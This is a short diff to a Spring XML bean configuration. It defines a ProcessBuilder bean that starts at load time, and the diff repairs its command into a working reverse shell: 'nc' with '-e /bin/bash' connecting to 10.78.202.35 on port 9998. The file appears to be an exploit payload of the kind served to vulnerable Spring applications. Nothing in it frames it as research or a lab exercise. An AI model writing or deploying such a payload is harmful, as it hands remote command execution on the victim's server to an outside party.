@@ -4,8 +4,9 @@
     <bean id="processBuilder" class="java.lang.ProcessBuilder" init-method="start">
       <constructor-arg>
         <list>
-          <value>netcat</value>
+          <value>nc</value>
           <value>10.78.202.35</value>
+          <value>9998</value>
           <value>-e</value>
           <value>/bin/bash</value>
         </list>
